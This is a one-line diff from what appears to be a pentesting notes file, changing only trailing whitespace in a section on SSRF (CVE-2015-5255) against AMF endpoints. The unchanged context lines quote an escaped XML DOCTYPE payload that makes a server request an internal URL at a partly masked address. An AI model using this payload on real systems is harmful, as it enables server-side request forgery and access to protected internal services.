@@ -528,7 +528,7 @@ Content-type: application/x-amf
 #### SSRF(CVE-2015-5255)
 
 ```
-&lt;!DOCTYPE foo PUBLIC &#34;-//VSR//PENTEST//EN&#34;
+&lt;!DOCTYPE foo PUBLIC &#34;-//VSR//PENTEST//EN&#34; 
 &#34;http://49.x.y.z:8888/protected-service&#34;&gt;&lt;foo&gt;Some content&lt;/foo&gt;
 ```
 
